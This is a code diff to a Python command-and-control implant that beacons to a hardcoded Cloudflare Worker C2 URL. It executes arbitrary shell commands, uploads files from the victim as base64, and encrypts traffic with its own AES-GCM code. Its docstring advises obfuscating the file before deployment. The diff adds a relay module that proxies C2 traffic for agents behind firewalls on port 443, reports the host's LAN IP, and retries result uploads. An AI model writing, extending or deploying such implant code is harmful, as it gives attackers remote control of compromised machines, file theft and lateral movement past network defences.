@@ -32,8 +32,11 @@ Agent identity:
   Deterministic and stable across reboots. Print with:  python3 agent.py --id
 
 Supported commands:
-  <any shell string>       executed via /bin/sh, stdout+stderr returned
-  UPLOAD:/path/to/file     file read in binary mode, returned as base64
+  <any shell string>         executed via /bin/sh, stdout+stderr returned
+  UPLOAD:/path/to/file       file read in binary mode, returned as base64
+  /module relay start [port] start HTTP relay on port (default 443)
+  /module relay stop         stop the relay
+  /module relay status       show relay state
 
 Environment variables (bake these before obfuscating):
   WORKER_URL      Cloudflare Worker URL   (required)
@@ -43,13 +46,14 @@ Environment variables (bake these before obfuscating):
   C2_RELAY_PORT   if set, start HTTP relay server on this port (default: 0 = off)
   C2_RELAY_BIND   relay listen address    (default: 0.0.0.0)
 
-Relay mode (C2_RELAY_PORT):
+Relay mode (C2_RELAY_PORT or /module relay start):
   Enables a plain-HTTP server that proxies Worker API calls from isolated agents
   that cannot reach WORKER_URL directly (e.g. behind a firewall). The relay
   validates the Bearer token, then forwards to the real WORKER_URL over HTTPS.
-  Isolated agent config: set WORKER_URL=http://<relay_host>:<C2_RELAY_PORT>.
+  Isolated agent config: set WORKER_URL=http://<relay_host>:<relay_port>.
   Both relay and isolated agent must share the same PSK (token is identical).
   The relay runs in a daemon thread; normal beacon loop is unaffected.
+  Can be started/stopped dynamically via /module relay without redeploying.
 
 Dependencies: Python 3.6+ stdlib only. No pip required on the target.
 
@@ -64,7 +68,7 @@ Limitations:
 """
 
 import base64, hashlib, hmac as _hmac, http.server, json, os, platform
-import random, socketserver, ssl, struct, subprocess, sys, threading, time
+import random, socket, socketserver, ssl, struct, subprocess, sys, threading, time
 import urllib.error, urllib.request
 
 WORKER_URL  = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
@@ -73,6 +77,8 @@ BEACON_INT  = int(os.environ.get("C2_INT",    "30"))
 JITTER      = int(os.environ.get("C2_JITTER", "10"))
 RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
 RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")
+
+_relay_server = None
 
 # ── Pure-Python AES-256-GCM ──────────────────────────────────────────────────
 # Implements NIST FIPS 197 (AES block cipher) and SP 800-38D (GCM mode).
@@ -224,7 +230,7 @@ def _put(url: str, body: str) -> int:
         method="PUT",
     )
     try:
-        with urllib.request.urlopen(req, context=_SSL, timeout=15):
+        with urllib.request.urlopen(req, context=_SSL, timeout=5):
             return 200
     except urllib.error.HTTPError as e:
         return e.code
@@ -235,7 +241,7 @@ def _put(url: str, body: str) -> int:
 def _get(url: str) -> tuple:
     req = urllib.request.Request(url, headers=_HDRS)
     try:
-        with urllib.request.urlopen(req, context=_SSL, timeout=15) as r:
+        with urllib.request.urlopen(req, context=_SSL, timeout=5) as r:
             return r.status, r.read().decode()
     except urllib.error.HTTPError as e:
         return e.code, ""
@@ -260,6 +266,15 @@ def _decrypt(token: str) -> dict:
 # ── Relay server ─────────────────────────────────────────────────────────────
 
 
+def _get_lan_ip() -> str:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return ""
+
+
 class _RelayHandler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *_): pass
 
@@ -273,7 +288,7 @@ class _RelayHandler(http.server.BaseHTTPRequestHandler):
         req = urllib.request.Request(url, data=body, headers=hdrs, method=self.command)
         ctx = _SSL if url.startswith("https://") else None
         try:
-            with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
+            with urllib.request.urlopen(req, context=ctx, timeout=5) as r:
                 data = r.read()
                 self.send_response(r.status); self.end_headers(); self.wfile.write(data)
         except urllib.error.HTTPError as e:
@@ -289,9 +304,39 @@ class _RelayHandler(http.server.BaseHTTPRequestHandler):
 
 
 def _start_relay():
+    global _relay_server
+    socketserver.ThreadingTCPServer.allow_reuse_address = True
     srv = socketserver.ThreadingTCPServer((RELAY_BIND, RELAY_PORT), _RelayHandler)
     srv.daemon_threads = True
+    _relay_server = srv
     threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+
+def _module_relay(args: list) -> str:
+    global RELAY_PORT, _relay_server
+    sub = args[0] if args else "start"
+    if sub == "start":
+        try:
+            port = int(args[1]) if len(args) > 1 else 443
+        except ValueError:
+            return "[usage: /module relay start [port]]"
+        if _relay_server:
+            _relay_server.shutdown()
+            _relay_server = None
+        RELAY_PORT = port
+        _start_relay()
+        return f"[relay started :{port} → {WORKER_URL}]"
+    if sub == "stop":
+        if _relay_server:
+            _relay_server.shutdown()
+            _relay_server = None
+            return "[relay stopped]"
+        return "[relay not running]"
+    if sub == "status":
+        if _relay_server:
+            return f"[relay active :{RELAY_PORT} → {WORKER_URL}]"
+        return "[relay inactive]"
+    return f"[unknown relay subcommand: {sub}]"
 
 
 # ── Agent logic ───────────────────────────────────────────────────────────────
@@ -312,13 +357,21 @@ def _sysinfo() -> dict:
         "release":    platform.release(),
         "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
         "cwd":        os.getcwd(),
-        "relay_port": RELAY_PORT,
+        "relay_port": RELAY_PORT if _relay_server else 0,
+        "relay_host": _get_lan_ip() if _relay_server else "",
         "worker_url": WORKER_URL,
         "beacon_int": BEACON_INT,
     }
 
 
 def _exec(cmd: str) -> str:
+    if cmd.startswith("/module "):
+        parts = cmd[8:].split()
+        if not parts:
+            return "[usage: /module relay start [port] | stop | status]"
+        if parts[0] == "relay":
+            return _module_relay(parts[1:])
+        return f"[unknown module: {parts[0]}]"
     if cmd.startswith("UPLOAD:"):
         try:
             with open(cmd[7:], "rb") as f:
@@ -348,7 +401,11 @@ def _beacon():
     task   = _decrypt(body)
     output = _exec(task["cmd"])
     result = _encrypt({"task_id": task["task_id"], "output": output})
-    _put(f"{WORKER_URL}/result/{task['task_id']}", result)
+    result_url = f"{WORKER_URL}/result/{task['task_id']}"
+    for _ in range(5):
+        if _put(result_url, result) == 200:
+            break
+        time.sleep(1)
 
 
 def main():
